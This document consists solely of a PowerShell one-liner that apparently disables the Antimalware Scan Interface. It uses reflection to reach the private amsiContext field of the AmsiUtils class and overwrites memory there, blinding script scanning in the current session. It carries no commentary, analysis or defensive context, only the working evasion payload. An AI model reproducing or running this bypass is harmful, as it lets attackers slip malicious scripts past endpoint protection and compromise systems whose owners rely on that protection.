$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$f=$a.GetField('amsiContext','NonPublic,Static');$c=$f.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt64($c,8,0)
